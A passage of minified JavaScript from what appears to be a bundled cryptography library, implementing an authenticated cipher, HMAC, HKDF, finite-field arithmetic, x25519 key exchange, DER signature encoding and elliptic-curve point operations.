V=0;r[V++]=o+O|0,r[V++]=a+_|0,r[V++]=c+I|0,r[V++]=l+T|0,r[V++]=f+B|0,r[V++]=h+U|0,r[V++]=m+M|0,r[V++]=b+N|0,r[V++]=w+q|0,r[V++]=y+P|0,r[V++]=E+C|0,r[V++]=A+j|0,r[V++]=R+z|0,r[V++]=S+$|0,r[V++]=v+H|0,r[V++]=k+L|0}const pSe=uSe(hSe,{counterRight:!1,counterLength:4,allowShortKeys:!1}),mSe=new Uint8Array(16),uq=(t,e)=>{t.update(e);const n=e.length%16;n&&t.update(mSe.subarray(n))},gSe=new Uint8Array(32);function lq(t,e,n,r,i){const s=t(e,n,gSe),o=fSe.create(s);i&&uq(o,i),uq(o,r);const a=tSe(r.length,i?i.length:0,!0);o.update(a);const c=o.digest();return S1(s,a),c}const ySe=t=>(e,n,r)=>({encrypt(i,s){const o=i.length;s=oq(o+16,s,!1),s.set(i);const a=s.subarray(0,-16);t(e,n,a,a,1);const c=lq(t,e,n,a,r);return s.set(c,o),S1(c),s},decrypt(i,s){s=oq(i.length-16,s,!1);const o=i.subarray(0,-16),a=i.subarray(-16),c=lq(t,e,n,o,r);if(!XCe(a,c))throw new Error("invalid tag");return s.set(i.subarray(0,-16)),t(e,n,s,s,1),S1(c),s}}),Jse=eSe({blockSize:64,nonceLength:12,tagLength:16},ySe(pSe));let Xse=class extends QI{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,YI(e);const r=Mu(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,s=new Uint8Array(i);s.set(r.length>i?e.create().update(r).digest():r);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),Fc(s)}update(e){return Op(this),this.iHash.update(e),this}digestInto(e){Op(this),Lu(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=i,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}clone(){return this._cloneInto()}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const e8=(t,e,n)=>new Xse(t,e).update(n).digest();e8.create=(t,e)=>new Xse(t,e);function bSe(t,e,n){return YI(t),n===void 0&&(n=new Uint8Array(t.outputLen)),e8(t,Mu(n),Mu(e))}const b9=Uint8Array.from([0]),dq=Uint8Array.of();function wSe(t,e,n,r=32){YI(t),Nf(r);const i=t.outputLen;if(r>255*i)throw new Error("Length should be <= 255*HashLen");const s=Math.ceil(r/i);n===void 0&&(n=dq);const o=new Uint8Array(s*i),a=e8.create(t,e),c=a._cloneInto(),l=new Uint8Array(a.outputLen);for(let f=0;f<s;f++)b9[0]=f+1,c.update(f===0?dq:l).update(n).update(b9).digestInto(l),o.set(l,i*f),a._cloneInto(c);return a.destroy(),c.destroy(),Fc(l,b9),o.slice(0,r)}const vSe=(t,e,n,r,i)=>wSe(t,bSe(t,e,n),r,i),t8=JI,RB=BigInt(0),f7=BigInt(1);function kx(t,e=""){if(typeof t!="boolean"){const n=e&&`"${e}"`;throw new Error(n+"expected boolean, got type="+typeof t)}return t}function Mm(t,e,n=""){const r=ZI(t),i=t?.length,s=e!==void 0;if(!r||s&&i!==e){const o=n&&`"${n}" `,a=s?` of length ${e}`:"",c=r?`length=${i}`:`type=${typeof t}`;throw new Error(o+"expected Uint8Array"+a+", got "+c)}return t}function V3(t){const e=t.toString(16);return e.length&1?"0"+e:e}function eoe(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?RB:BigInt("0x"+t)}function n8(t){return eoe(e1(t))}function Dx(t){return Lu(t),eoe(e1(Uint8Array.from(t).reverse()))}function PB(t,e){return Nx(t.toString(16).padStart(e*2,"0"))}function NB(t,e){return PB(t,e).reverse()}function Vs(t,e,n){let r;if(typeof e=="string")try{r=Nx(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(ZI(e))r=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=r.length;if(typeof n=="number"&&i!==n)throw new Error(t+" of length "+n+" expected, got "+i);return r}const w9=t=>typeof t=="bigint"&&RB<=t;function ESe(t,e,n){return w9(t)&&w9(e)&&w9(n)&&e<=t&&t<n}function h7(t,e,n,r){if(!ESe(e,n,r))throw new Error("expected valid "+t+": "+n+" <= n < "+r+", got "+e)}function toe(t){let e;for(e=0;t>RB;t>>=f7,e+=1);return e}const tA=t=>(f7<<BigInt(t))-f7;function _Se(t,e,n){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof n!="function")throw new Error("hmacFn must be a function");const r=m=>new Uint8Array(m),i=m=>Uint8Array.of(m);let s=r(t),o=r(t),a=0;const c=()=>{s.fill(1),o.fill(0),a=0},l=(...m)=>n(o,s,...m),f=(m=r(0))=>{o=l(i(0),m),s=l(),m.length!==0&&(o=l(i(1),m),s=l())},h=()=>{if(a++>=1e3)throw new Error("drbg: tried 1000 values");let m=0;const b=[];for(;m<e;){s=l();const w=s.slice();b.push(w),m+=s.length}return fp(...b)};return(m,b)=>{c(),f(m);let w;for(;!(w=b(h()));)f();return c(),w}}function r8(t,e,n={}){if(!t||typeof t!="object")throw new Error("expected valid options object");function r(i,s,o){const a=t[i];if(o&&a===void 0)return;const c=typeof a;if(c!==s||a===null)throw new Error(`param "${i}" is invalid: expected ${s}, got ${c}`)}Object.entries(e).forEach(([i,s])=>r(i,s,!1)),Object.entries(n).forEach(([i,s])=>r(i,s,!0))}function fq(t){const e=new WeakMap;return(n,...r)=>{const i=e.get(n);if(i!==void 0)return i;const s=t(n,...r);return e.set(n,s),s}}const ea=BigInt(0),wo=BigInt(1),Um=BigInt(2),noe=BigInt(3),roe=BigInt(4),ioe=BigInt(5),ASe=BigInt(7),soe=BigInt(8),CSe=BigInt(9),ooe=BigInt(16);function qa(t,e){const n=t%e;return n>=ea?n:e+n}function Eu(t,e,n){let r=t;for(;e-- >ea;)r*=r,r%=n;return r}function hq(t,e){if(t===ea)throw new Error("invert: expected non-zero number");if(e<=ea)throw new Error("invert: expected positive modulus, got "+e);let n=qa(t,e),r=e,i=ea,s=wo;for(;n!==ea;){const o=r/n,a=r%n,c=i-s*o;r=n,n=a,i=s,s=c}if(r!==wo)throw new Error("invert: does not exist");return qa(i,e)}function OB(t,e,n){if(!t.eql(t.sqr(e),n))throw new Error("Cannot find square root")}function aoe(t,e){const n=(t.ORDER+wo)/roe,r=t.pow(e,n);return OB(t,r,e),r}function SSe(t,e){const n=(t.ORDER-ioe)/soe,r=t.mul(e,Um),i=t.pow(r,n),s=t.mul(e,i),o=t.mul(t.mul(s,Um),i),a=t.mul(s,t.sub(o,t.ONE));return OB(t,a,e),a}function TSe(t){const e=Kp(t),n=coe(t),r=n(e,e.neg(e.ONE)),i=n(e,r),s=n(e,e.neg(r)),o=(t+ASe)/ooe;return(a,c)=>{let l=a.pow(c,o),f=a.mul(l,r);const h=a.mul(l,i),m=a.mul(l,s),b=a.eql(a.sqr(f),c),w=a.eql(a.sqr(h),c);l=a.cmov(l,f,b),f=a.cmov(m,h,w);const y=a.eql(a.sqr(f),c),E=a.cmov(l,f,y);return OB(a,E,c),E}}function coe(t){if(t<noe)throw new Error("sqrt is not defined for small field");let e=t-wo,n=0;for(;e%Um===ea;)e/=Um,n++;let r=Um;const i=Kp(t);for(;pq(i,r)===1;)if(r++>1e3)throw new Error("Cannot find square root: probably non-prime P");if(n===1)return aoe;let s=i.pow(r,e);const o=(e+wo)/Um;return function(a,c){if(a.is0(c))return c;if(pq(a,c)!==1)throw new Error("Cannot find square root");let l=n,f=a.mul(a.ONE,s),h=a.pow(c,e),m=a.pow(c,o);for(;!a.eql(h,a.ONE);){if(a.is0(h))return a.ZERO;let b=1,w=a.sqr(h);for(;!a.eql(w,a.ONE);)if(b++,w=a.sqr(w),b===l)throw new Error("Cannot find square root");const y=wo<<BigInt(l-b-1),E=a.pow(f,y);l=b,f=a.sqr(E),h=a.mul(h,f),m=a.mul(m,E)}return m}}function xSe(t){return t%roe===noe?aoe:t%soe===ioe?SSe:t%ooe===CSe?TSe(t):coe(t)}const ISe=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function RSe(t){const e={ORDER:"bigint",MASK:"bigint",BYTES:"number",BITS:"number"},n=ISe.reduce((r,i)=>(r[i]="function",r),e);return r8(t,n),t}function PSe(t,e,n){if(n<ea)throw new Error("invalid exponent, negatives unsupported");if(n===ea)return t.ONE;if(n===wo)return e;let r=t.ONE,i=e;for(;n>ea;)n&wo&&(r=t.mul(r,i)),i=t.sqr(i),n>>=wo;return r}function uoe(t,e,n=!1){const r=new Array(e.length).fill(n?t.ZERO:void 0),i=e.reduce((o,a,c)=>t.is0(a)?o:(r[c]=o,t.mul(o,a)),t.ONE),s=t.inv(i);return e.reduceRight((o,a,c)=>t.is0(a)?o:(r[c]=t.mul(o,r[c]),t.mul(o,a)),s),r}function pq(t,e){const n=(t.ORDER-wo)/Um,r=t.pow(e,n),i=t.eql(r,t.ONE),s=t.eql(r,t.ZERO),o=t.eql(r,t.neg(t.ONE));if(!i&&!s&&!o)throw new Error("invalid Legendre symbol result");return i?1:s?0:-1}function loe(t,e){e!==void 0&&Nf(e);const n=e!==void 0?e:t.toString(2).length,r=Math.ceil(n/8);return{nBitLength:n,nByteLength:r}}function Kp(t,e,n=!1,r={}){if(t<=ea)throw new Error("invalid field: expected ORDER > 0, got "+t);let i,s,o=!1,a;if(typeof e=="object"&&e!=null){if(r.sqrt||n)throw new Error("cannot specify opts in two arguments");const m=e;m.BITS&&(i=m.BITS),m.sqrt&&(s=m.sqrt),typeof m.isLE=="boolean"&&(n=m.isLE),typeof m.modFromBytes=="boolean"&&(o=m.modFromBytes),a=m.allowedLengths}else typeof e=="number"&&(i=e),r.sqrt&&(s=r.sqrt);const{nBitLength:c,nByteLength:l}=loe(t,i);if(l>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let f;const h=Object.freeze({ORDER:t,isLE:n,BITS:c,BYTES:l,MASK:tA(c),ZERO:ea,ONE:wo,allowedLengths:a,create:m=>qa(m,t),isValid:m=>{if(typeof m!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof m);return ea<=m&&m<t},is0:m=>m===ea,isValidNot0:m=>!h.is0(m)&&h.isValid(m),isOdd:m=>(m&wo)===wo,neg:m=>qa(-m,t),eql:(m,b)=>m===b,sqr:m=>qa(m*m,t),add:(m,b)=>qa(m+b,t),sub:(m,b)=>qa(m-b,t),mul:(m,b)=>qa(m*b,t),pow:(m,b)=>PSe(h,m,b),div:(m,b)=>qa(m*hq(b,t),t),sqrN:m=>m*m,addN:(m,b)=>m+b,subN:(m,b)=>m-b,mulN:(m,b)=>m*b,inv:m=>hq(m,t),sqrt:s||(m=>(f||(f=xSe(t)),f(h,m))),toBytes:m=>n?NB(m,l):PB(m,l),fromBytes:(m,b=!0)=>{if(a){if(!a.includes(m.length)||m.length>l)throw new Error("Field.fromBytes: expected "+a+" bytes, got "+m.length);const y=new Uint8Array(l);y.set(m,n?0:y.length-m.length),m=y}if(m.length!==l)throw new Error("Field.fromBytes: expected "+l+" bytes, got "+m.length);let w=n?Dx(m):n8(m);if(o&&(w=qa(w,t)),!b&&!h.isValid(w))throw new Error("invalid field element: outside of range 0..ORDER");return w},invertBatch:m=>uoe(h,m),cmov:(m,b,w)=>w?b:m});return Object.freeze(h)}function doe(t){if(typeof t!="bigint")throw new Error("field order must be bigint");const e=t.toString(2).length;return Math.ceil(e/8)}function foe(t){const e=doe(t);return e+Math.ceil(e/2)}function NSe(t,e,n=!1){const r=t.length,i=doe(e),s=foe(e);if(r<16||r<s||r>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+r);const o=n?Dx(t):n8(t),a=qa(o,e-wo)+wo;return n?NB(a,i):PB(a,i)}const T1=BigInt(0),Lm=BigInt(1);function Bx(t,e){const n=e.negate();return t?n:e}function v9(t,e){const n=uoe(t.Fp,e.map(r=>r.Z));return e.map((r,i)=>t.fromAffine(r.toAffine(n[i])))}function hoe(t,e){if(!Number.isSafeInteger(t)||t<=0||t>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+t)}function E9(t,e){hoe(t,e);const n=Math.ceil(e/t)+1,r=2**(t-1),i=2**t,s=tA(t),o=BigInt(t);return{windows:n,windowSize:r,mask:s,maxNumber:i,shiftBy:o}}function mq(t,e,n){const{windowSize:r,mask:i,maxNumber:s,shiftBy:o}=n;let a=Number(t&i),c=t>>o;a>r&&(a-=s,c+=Lm);const l=e*r,f=l+Math.abs(a)-1,h=a===0,m=a<0,b=e%2!==0;return{nextN:c,offset:f,isZero:h,isNeg:m,isNegF:b,offsetF:l}}function OSe(t,e){if(!Array.isArray(t))throw new Error("array expected");t.forEach((n,r)=>{if(!(n instanceof e))throw new Error("invalid point at index "+r)})}function kSe(t,e){if(!Array.isArray(t))throw new Error("array of scalars expected");t.forEach((n,r)=>{if(!e.isValid(n))throw new Error("invalid scalar at index "+r)})}const _9=new WeakMap,poe=new WeakMap;function A9(t){return poe.get(t)||1}function gq(t){if(t!==T1)throw new Error("invalid wNAF")}class DSe{constructor(e,n){this.BASE=e.BASE,this.ZERO=e.ZERO,this.Fn=e.Fn,this.bits=n}_unsafeLadder(e,n,r=this.ZERO){let i=e;for(;n>T1;)n&Lm&&(r=r.add(i)),i=i.double(),n>>=Lm;return r}precomputeWindow(e,n){const{windows:r,windowSize:i}=E9(n,this.bits),s=[];let o=e,a=o;for(let c=0;c<r;c++){a=o,s.push(a);for(let l=1;l<i;l++)a=a.add(o),s.push(a);o=a.double()}return s}wNAF(e,n,r){if(!this.Fn.isValid(r))throw new Error("invalid scalar");let i=this.ZERO,s=this.BASE;const o=E9(e,this.bits);for(let a=0;a<o.windows;a++){const{nextN:c,offset:l,isZero:f,isNeg:h,isNegF:m,offsetF:b}=mq(r,a,o);r=c,f?s=s.add(Bx(m,n[b])):i=i.add(Bx(h,n[l]))}return gq(r),{p:i,f:s}}wNAFUnsafe(e,n,r,i=this.ZERO){const s=E9(e,this.bits);for(let o=0;o<s.windows&&r!==T1;o++){const{nextN:a,offset:c,isZero:l,isNeg:f}=mq(r,o,s);if(r=a,!l){const h=n[c];i=i.add(f?h.negate():h)}}return gq(r),i}getPrecomputes(e,n,r){let i=_9.get(n);return i||(i=this.precomputeWindow(n,e),e!==1&&(typeof r=="function"&&(i=r(i)),_9.set(n,i))),i}cached(e,n,r){const i=A9(e);return this.wNAF(i,this.getPrecomputes(i,e,r),n)}unsafe(e,n,r,i){const s=A9(e);return s===1?this._unsafeLadder(e,n,i):this.wNAFUnsafe(s,this.getPrecomputes(s,e,r),n,i)}createCache(e,n){hoe(n,this.bits),poe.set(e,n),_9.delete(e)}hasCache(e){return A9(e)!==1}}function BSe(t,e,n,r){let i=e,s=t.ZERO,o=t.ZERO;for(;n>T1||r>T1;)n&Lm&&(s=s.add(i)),r&Lm&&(o=o.add(i)),i=i.double(),n>>=Lm,r>>=Lm;return{p1:s,p2:o}}function jSe(t,e,n,r){OSe(n,t),kSe(r,e);const i=n.length,s=r.length;if(i!==s)throw new Error("arrays of points and scalars must have equal length");const o=t.ZERO,a=toe(BigInt(i));let c=1;a>12?c=a-3:a>4?c=a-2:a>0&&(c=2);const l=tA(c),f=new Array(Number(l)+1).fill(o),h=Math.floor((e.BITS-1)/c)*c;let m=o;for(let b=h;b>=0;b-=c){f.fill(o);for(let y=0;y<s;y++){const E=r[y],A=Number(E>>BigInt(b)&l);f[A]=f[A].add(n[y])}let w=o;for(let y=f.length-1,E=o;y>0;y--)E=E.add(f[y]),w=w.add(E);if(m=m.add(w),b!==0)for(let y=0;y<c;y++)m=m.double()}return m}function yq(t,e,n){if(e){if(e.ORDER!==t)throw new Error("Field.ORDER must match order: Fp == p, Fn == n");return RSe(e),e}else return Kp(t,{isLE:n})}function MSe(t,e,n={},r){if(r===void 0&&(r=t==="edwards"),!e||typeof e!="object")throw new Error(`expected valid ${t} CURVE object`);for(const a of["p","n","h"]){const c=e[a];if(!(typeof c=="bigint"&&c>T1))throw new Error(`CURVE.${a} must be positive bigint`)}const i=yq(e.p,n.Fp,r),s=yq(e.n,n.Fn,r),o=["Gx","Gy","a","b"];for(const a of o)if(!i.isValid(e[a]))throw new Error(`CURVE.${a} must be valid field element of CURVE.Fp`);return e=Object.freeze(Object.assign({},e)),{CURVE:e,Fp:i,Fn:s}}BigInt(0),BigInt(1),BigInt(2),BigInt(8),Mse("HashToScalar-");const xv=BigInt(0),sb=BigInt(1),W3=BigInt(2);function USe(t){return r8(t,{adjustScalarBytes:"function",powPminus2:"function"}),Object.freeze({...t})}function LSe(t){const e=USe(t),{P:n,type:r,adjustScalarBytes:i,powPminus2:s,randomBytes:o}=e,a=r==="x25519";if(!a&&r!=="x448")throw new Error("invalid type");const c=o||Hg,l=a?255:448,f=a?32:56,h=BigInt(a?9:5),m=BigInt(a?121665:39081),b=a?W3**BigInt(254):W3**BigInt(447),w=a?BigInt(8)*W3**BigInt(251)-sb:BigInt(4)*W3**BigInt(445)-sb,y=b+w+sb,E=M=>qa(M,n),A=R(h);function R(M){return NB(E(M),f)}function S(M){const N=Vs("u coordinate",M,f);return a&&(N[31]&=127),E(Dx(N))}function v(M){return Dx(i(Vs("scalar",M,f)))}function k(M,N){const q=I(S(N),v(M));if(q===xv)throw new Error("invalid private or public key received");return R(q)}function O(M){return k(M,A)}function _(M,N,q){const P=E(M*(N-q));return N=E(N-P),q=E(q+P),{x_2:N,x_3:q}}function I(M,N){h7("u",M,xv,n),h7("scalar",N,b,y);const q=N,P=M;let C=sb,j=xv,z=M,$=sb,H=xv;for(let V=BigInt(l-1);V>=xv;V--){const G=q>>V&sb;H^=G,{x_2:C,x_3:z}=_(H,C,z),{x_2:j,x_3:$}=_(H,j,$),H=G;const Z=C+j,J=E(Z*Z),ne=C-j,re=E(ne*ne),le=J-re,oe=z+$,ue=z-$,be=E(ue*Z),Me=E(oe*ne),Te=be+Me,Oe=be-Me;z=E(Te*Te),$=E(P*E(Oe*Oe)),C=E(J*re),j=E(le*(J+E(m*le)))}({x_2:C,x_3:z}=_(H,C,z)),{x_2:j,x_3:$}=_(H,j,$);const L=s(j);return E(C*L)}const T={secretKey:f,publicKey:f,seed:f},B=(M=c(f))=>(Lu(M,T.seed),M);function U(M){const N=B(M);return{secretKey:N,publicKey:O(N)}}return{keygen:U,getSharedSecret:(M,N)=>k(M,N),getPublicKey:M=>O(M),scalarMult:k,scalarMultBase:O,utils:{randomSecretKey:B,randomPrivateKey:B},GuBytes:A.slice(),lengths:T}}const FSe=BigInt(1),bq=BigInt(2),$Se=BigInt(3),HSe=BigInt(5);BigInt(8);const moe=BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed"),zSe={p:moe,n:BigInt("0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"),a:BigInt("0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec"),d:BigInt("0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3"),Gx:BigInt("0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a"),Gy:BigInt("0x6666666666666666666666666666666666666666666666666666666666666658")};function qSe(t){const e=BigInt(10),n=BigInt(20),r=BigInt(40),i=BigInt(80),s=moe,o=t*t%s*t%s,a=Eu(o,bq,s)*o%s,c=Eu(a,FSe,s)*t%s,l=Eu(c,HSe,s)*c%s,f=Eu(l,e,s)*l%s,h=Eu(f,n,s)*f%s,m=Eu(h,r,s)*h%s,b=Eu(m,i,s)*m%s,w=Eu(b,i,s)*m%s,y=Eu(w,e,s)*l%s;return{pow_p_5_8:Eu(y,bq,s)*t%s,b2:o}}function VSe(t){return t[0]&=248,t[31]&=127,t[31]|=64,t}const WSe=Kp(zSe.p,{isLE:!0}),p7=(()=>{const t=WSe.ORDER;return LSe({P:t,type:"x25519",powPminus2:e=>{const{pow_p_5_8:n,b2:r}=qSe(e);return qa(Eu(n,$Se,t)*r,t)},adjustScalarBytes:VSe})})(),wq=(t,e)=>(t+(t>=0?e:-e)/goe)/e;function GSe(t,e,n){const[[r,i],[s,o]]=e,a=wq(o*t,n),c=wq(-i*t,n);let l=t-a*r-c*s,f=-a*i-c*o;const h=l<bf,m=f<bf;h&&(l=-l),m&&(f=-f);const b=tA(Math.ceil(toe(n)/2))+t1;if(l<bf||l>=b||f<bf||f>=b)throw new Error("splitScalar (endomorphism): failed, k="+t);return{k1neg:h,k1:l,k2neg:m,k2:f}}function m7(t){if(!["compact","recovered","der"].includes(t))throw new Error('Signature format must be "compact", "recovered", or "der"');return t}function C9(t,e){const n={};for(let r of Object.keys(e))n[r]=t[r]===void 0?e[r]:t[r];return kx(n.lowS,"lowS"),kx(n.prehash,"prehash"),n.format!==void 0&&m7(n.format),n}class KSe extends Error{constructor(e=""){super(e)}}const ff={Err:KSe,_tlv:{encode:(t,e)=>{const{Err:n}=ff;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length&1)throw new n("tlv.encode: unpadded data");const r=e.length/2,i=V3(r);if(i.length/2&128)throw new n("tlv.encode: long form length too big");const s=r>127?V3(i.length/2|128):"";return V3(t)+s+i+e},decode(t,e){const{Err:n}=ff;let r=0;if(t<0||t>256)throw new n("tlv.encode: wrong tag");if(e.length<2||e[r++]!==t)throw new n("tlv.decode: wrong tlv");const i=e[r++],s=!!(i&128);let o=0;if(!s)o=i;else{const c=i&127;if(!c)throw new n("tlv.decode(long): indefinite length not supported");if(c>4)throw new n("tlv.decode(long): byte length is too big");const l=e.subarray(r,r+c);if(l.length!==c)throw new n("tlv.decode: length bytes not complete");if(l[0]===0)throw new n("tlv.decode(long): zero leftmost byte");for(const f of l)o=o<<8|f;if(r+=c,o<128)throw new n("tlv.decode(long): not minimal encoding")}const a=e.subarray(r,r+o);if(a.length!==o)throw new n("tlv.decode: wrong value length");return{v:a,l:e.subarray(r+o)}}},_int:{encode(t){const{Err:e}=ff;if(t<bf)throw new e("integer: negative integers are not allowed");let n=V3(t);if(Number.parseInt(n[0],16)&8&&(n="00"+n),n.length&1)throw new e("unexpected DER parsing assertion: unpadded hex");return n},decode(t){const{Err:e}=ff;if(t[0]&128)throw new e("invalid signature integer: negative");if(t[0]===0&&!(t[1]&128))throw new e("invalid signature integer: unnecessary leading zero");return n8(t)}},toSig(t){const{Err:e,_int:n,_tlv:r}=ff,i=Vs("signature",t),{v:s,l:o}=r.decode(48,i);if(o.length)throw new e("invalid signature: left bytes after parsing");const{v:a,l:c}=r.decode(2,s),{v:l,l:f}=r.decode(2,c);if(f.length)throw new e("invalid signature: left bytes after parsing");return{r:n.decode(a),s:n.decode(l)}},hexFromSig(t){const{_tlv:e,_int:n}=ff,r=e.encode(2,n.encode(t.r)),i=e.encode(2,n.encode(t.s)),s=r+i;return e.encode(48,s)}},bf=BigInt(0),t1=BigInt(1),goe=BigInt(2),G3=BigInt(3),ZSe=BigInt(4);function Hb(t,e){const{BYTES:n}=t;let r;if(typeof e=="bigint")r=e;else{let i=Vs("private key",e);try{r=t.fromBytes(i)}catch{throw new Error(`invalid private key: expected ui8a of size ${n}, got ${typeof e}`)}}if(!t.isValidNot0(r))throw new Error("invalid private key: out of range [1..N-1]");return r}function YSe(t,e={}){const n=MSe("weierstrass",t,e),{Fp:r,Fn:i}=n;let s=n.CURVE;const{h:o,n:a}=s;r8(e,{},{allowInfinityPoint:"boolean",clearCofactor:"function",isTorsionFree:"function",fromBytes:"function",toBytes:"function",endo:"object",wrapPrivateKey:"boolean"});const{endo:c}=e;if(c&&(!r.is0(s.a)||typeof c.beta!="bigint"||!Array.isArray(c.basises)))throw new Error('invalid endo: expected "beta": bigint and "basises": array');const l=boe(r,i);function f(){if(!r.isOdd)throw new Error("compression is not supported: Field does not have .isOdd()")}function h(M,N,q){const{x:P,y:C}=N.toAffine(),j=r.toBytes(P);if(kx(q,"isCompressed"),q){f();const z=!r.isOdd(C);return fp(yoe(z),j)}else return fp(Uint8Array.of(4),j,r.toBytes(C))}function m(M){Mm(M,void 0,"Point");const{publicKey:N,publicKeyUncompressed:q}=l,P=M.length,C=M[0],j=M.subarray(1);if(P===N&&(C===2||C===3)){const z=r.fromBytes(j);if(!r.isValid(z))throw new Error("bad point: is not on curve, wrong x");const $=y(z);let H;try{H=r.sqrt($)}catch(V){const G=V instanceof Error?": "+V.message:"";throw new Error("bad point: is not on curve, sqrt error"+G)}f();const L=r.isOdd(H);return(C&1)===1!==L&&(H=r.neg(H)),{x:z,y:H}}else if(P===q&&C===4){const z=r.BYTES,$=r.fromBytes(j.subarray(0,z)),H=r.fromBytes(j.subarray(z,z*2));if(!E($,H))throw new Error("bad point: is not on curve");return{x:$,y:H}}else throw new Error(`bad point: got length ${P}, expected compressed=${N} or uncompressed=${q}`)}const b=e.toBytes||h,w=e.fromBytes||m;function y(M){const N=r.sqr(M),q=r.mul(N,M);return r.add(r.add(q,r.mul(M,s.a)),s.b)}function E(M,N){const q=r.sqr(N),P=y(M);return r.eql(q,P)}if(!E(s.Gx,s.Gy))throw new Error("bad curve params: generator point");const A=r.mul(r.pow(s.a,G3),ZSe),R=r.mul(r.sqr(s.b),BigInt(27));if(r.is0(r.add(A,R)))throw new Error("bad curve params: a or b");function S(M,N,q=!1){if(!r.isValid(N)||q&&r.is0(N))throw new Error(`bad point coordinate ${M}`);return N}function v(M){if(!(M instanceof T))throw new Error("ProjectivePoint expected")}function k(M){if(!c||!c.basises)throw new Error("no endo");return GSe(M,c.basises,i.ORDER)}const O=fq((M,N)=>{const{X:q,Y:P,Z:C}=M;if(r.eql(C,r.ONE))return{x:q,y:P};const j=M.is0();N==null&&(N=j?r.ONE:r.inv(C));const z=r.mul(q,N),$=r.mul(P,N),H=r.mul(C,N);if(j)return{x:r.ZERO,y:r.ZERO};if(!r.eql(H,r.ONE))throw new Error("invZ was invalid");return{x:z,y:$}}),_=fq(M=>{if(M.is0()){if(e.allowInfinityPoint&&!r.is0(M.Y))return;throw new Error("bad point: ZERO")}const{x:N,y:q}=M.toAffine();if(!r.isValid(N)||!r.isValid(q))throw new Error("bad point: x or y not field elements");if(!E(N,q))throw new Error("bad point: equation left != right");if(!M.isTorsionFree())throw new Error("bad point: not in prime-order subgroup");return!0});function I(M,N,q,P,C){return q=new T(r.mul(q.X,M),q.Y,q.Z),N=Bx(P,N),q=Bx(C,q),N.add(q)}class T{constructor(N,q,P){this.X=S("x",N),this.Y=S("y",q,!0),this.Z=S("z",P),Object.freeze(this)}static CURVE(){return s}static fromAffine(N){const{x:q,y:P}=N||{};if(!N||!r.isValid(q)||!r.isValid(P))throw new Error("invalid affine point");if(N instanceof T)throw new Error("projective point not allowed");return r.is0(q)&&r.is0(P)?T.ZERO:new T(q,P,r.ONE)}static fromBytes(N){const q=T.fromAffine(w(Mm(N,void 0,"point")));return q.assertValidity(),q}static fromHex(N){return T.fromBytes(Vs("pointHex",N))}get x(){return this.toAffine().x}get y(){return this.toAffine().y}precompute(N=8,q=!0){return U.createCache(this,N),q||this.multiply(G3),this}assertValidity(){_(this)}hasEvenY(){const{y:N}=this.toAffine();if(!r.isOdd)throw new Error("Field doesn't support isOdd");return!r.isOdd(N)}equals(N){v(N);const{X:q,Y:P,Z:C}=this,{X:j,Y:z,Z:$}=N,H=r.eql(r.mul(q,$),r.mul(j,C)),L=r.eql(r.mul(P,$),r.mul(z,C));return H&&L}negate(){return new T(this.X,r.neg(this.Y),this.Z)}double(){const{a:N,b:q}=s,P=r.mul(q,G3),{X:C,Y:j,Z:z}=this;let $=r.ZERO,H=r.ZERO,L=r.ZERO,V=r.mul(C,C),G=r.mul(j,j),Z=r.mul(z,z),J=r.mul(C,j);return J=r.add(J,J),L=r.mul(C,z),L=r.add(L,L),$=r.mul(N,L),H=r.mul(P,Z),H=r.add($,H),$=r.sub(G,H),H=r.add(G,H),H=r.mul($,H),$=r.mul(J,$),L=r.mul(P,L),Z=r.mul(N,Z),J=r.sub(V,Z),J=r.mul(N,J),J=r.add(J,L),L=r.add(V,V),V=r.add(L,V),V=r.add(V,Z),V=r.mul(V,J),H=r.add(H,V),Z=r.mul(j,z),Z=r.add(Z,Z),V=r.mul(Z,J),$=r.sub($,V),L=r.mul(Z,G),L=r.add(L,L),L=r.add(L,L),new T($,H,L)}add(N){v(N);const{X:q,Y:P,Z:C}=this,{X:j,Y:z,Z:$}=N;let H=r.ZERO,L=r.ZERO,V=r.ZERO;const G=s.a,Z=r.mul(s.b,G3);let J=r.mul(q,j),ne=r.mul(P,z),re=r.mul(C,$),le=r.add(q,P),oe=r.add(j,z);le=r.mul(le,oe),oe=r.add(J,ne),le=r.sub(le,oe),oe=r.add(q,C);let ue=r.add(j,$);return 